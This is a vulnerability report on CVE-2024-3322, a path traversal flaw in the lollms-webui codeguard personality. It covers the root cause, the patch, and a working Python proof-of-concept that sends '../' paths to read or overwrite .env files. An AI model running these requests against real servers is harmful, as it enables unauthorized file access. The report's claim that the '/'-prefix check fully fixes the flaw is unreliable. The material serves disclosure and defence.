"# CVE-2024-3322 Detailed Report\n\n## Summary of the CVE\nCVE-2024-3322 is a path traversal vulnerability identified in the 'cyber_security/codeguard' native personality of the `parisneo/lollms-webui` application, affecting versions up to 9.4. The vulnerability is classified under **CWE-22** (Improper Limitation of a Pathname to a Restricted Directory), which allows attackers to exploit the application by providing malicious input that can traverse the file system. Specifically, the `process_folder` function in the `lollms-webui/zoos/personalities_zoo/cyber_security/codeguard/scripts/processor.py` file fails to properly sanitize the `code_folder_path` input, enabling attackers to specify arbitrary paths using `../` or absolute paths. This flaw can lead to unauthorized file read and overwrite capabilities, posing a significant risk of sensitive information disclosure and unauthorized file manipulation.\n\n## Root Cause of the Vulnerability\nThe root cause of the vulnerability lies in the `process_folder` function, which is designed to iterate through files in a specified directory (`code_folder_path`) without adequate validation of the input path. The relevant code snippet is as follows:\n\n```python\nfor file in code_folder_path.iterdir():\n    if file.is_dir():\n        if self.personality_config.process_subfolders:\n            docs_subfolder = docs_folder_path/file.stem\n            docs_subfolder.mkdir(exist_ok=True, parents=True)\n            self.process_folder(file, docs_subfolder, max_nb_tokens_in_file, tokenize, detokenize, accepted_file_types)\n```\n\nIn this code, `code_folder_path.iterdir()` is called without any checks to ensure that `code_folder_path` is indeed a safe and intended directory. An attacker can manipulate the `code_folder_path` parameter to include path traversal sequences (e.g., `../`) or absolute paths, allowing them to access files outside the intended directory. \n\nThe patch introduced in version 9.5 addresses this issue by implementing a path sanitization function that raises an exception if the path starts with a `/`, effectively preventing the traversal of directories that are not intended for access:\n\n```python\nif path.strip().startswith(\"/\"):\n    raise HTTPException(status_code=400, detail=exception_text)\n```\n\nThis change ensures that any attempt to access paths that could lead to unauthorized file access is blocked, thus mitigating the vulnerability.\n\n## Exploitation Details\nThe security advisory provides a proof of concept (PoC) that demonstrates how an attacker could exploit this vulnerability. The following steps outline the exploitation process:\n\n1. **Mount the Personality**: The attacker sends a POST request to mount the `cyber_security/codeguard` personality.\n   ```python\n   url = \"http://localhost:9600/mount_personality\"\n   json = {\"category\": \"cyber_security\", \"folder\": \"codeguard\", \"language\": \"\"}\n   requests.post(url, json=json)\n   ```\n\n2. **Modify Personality Settings**: The attacker modifies the settings of the mounted personality to include a malicious `code_folder_path` that uses path traversal to access sensitive files.\n   ```python\n   url = \"http://localhost:9600/set_active_personality_settings\"\n   json = [\n       {\"name\": \"code_folder_path\", \"type\": \"str\", \"value\": \"../../../../../../../../../../../../../home/retr0/PoC/sensitive/\"},\n       {\"name\": \"docs_folder_path\", \"type\": \"str\", \"value\": \"../../../../../../../../../../../../../home/retr0/PoC/sensitive/\"},\n       {\"name\": \"process_subfolders\", \"type\": \"bool\", \"value\": True},\n       {\"name\": \"files_to_parse\", \"type\": \"str\", \"value\": \".env\"}\n   ]\n   requests.post(url, json=json)\n   ```\n\n3. **Trigger the Workflow**: The attacker then triggers the workflow to start processing the files in the specified directory.\n   ```python\n   payload = {\"command\": \"start_detection\", \"parameters\": []}\n   sio.emit(\"execute_command\", payload)\n   ```\n\n4. **Access Sensitive Information**: The content of the sensitive files can be reflected in the response, allowing the attacker to read sensitive information or overwrite files in the specified directory.\n\n### Proof of Concept Script\nThe following Python script encapsulates the exploitation process:\n\n```python\nimport requests\nimport socketio\n\ndef exploit(url: str, port: str, leak_path: str, output_path: str) -> bool:\n    # Initialize socketio\n    sio = socketio.Client()\n    sio.connect(f\"http://{url}:{port}\")\n\n    print(f\"[*] Attempting to exploit {url}\")\n\n    # Mount the personality\n    print(\"\\t[*] Mounting personality\")\n    mount_url = f\"http://{url}:{port}/mount_personality\"\n    json = {\"category\": \"cyber_security\", \"folder\": \"codeguard\", \"language\": \"\"}\n    r = requests.post(mount_url, json=json)\n    print(f'\\t\\t[*] Response: {r.text}')\n\n    # Set active personality settings\n    print(\"\\t[*] Setting active personality settings\")\n    settings_url = f\"http://{url}:{port}/set_active_personality_settings\"\n    json = [\n        {\"name\": \"code_folder_path\", \"type\": \"str\", \"value\": leak_path},\n        {\"name\": \"docs_folder_path\", \"type\": \"str\", \"value\": output_path},\n        {\"name\": \"process_subfolders\", \"type\": \"bool\", \"value\": True},\n        {\"name\": \"files_to_parse\", \"type\": \"str\", \"value\": \".env\"}\n    ]\n    r = requests.post(settings_url, json=json)\n    print(f'\\t\\t[*] Response: {r.text}')\n\n    # Trigger the workflow\n    payload = {\"command\": \"start_detection\", \"parameters\": []}\n    sio.emit(\"execute_command\", payload)\n    print(f'\\t[*] Executed command: {payload}')\n\n# Example usage\nexploit(url=\"localhost\", port=\"9600\", leak_path=\"../../../../../../../../../../home/retr0/PoC/sensitive/\", output_path=\"../../../../../../../../../../home/retr0/PoC/sensitive/\")\n```\n\n## Conclusion\nCVE-2024-3322 represents a significant security risk due to its potential for arbitrary file access and manipulation. The vulnerability arises from inadequate input validation in the `process_folder` function, allowing attackers to exploit path traversal techniques. The patch introduced in version 9.5 effectively mitigates this risk by implementing path sanitization measures. Users of the `parisneo/lollms-webui` application are advised to upgrade to version 9.5 or later to protect against this vulnerability."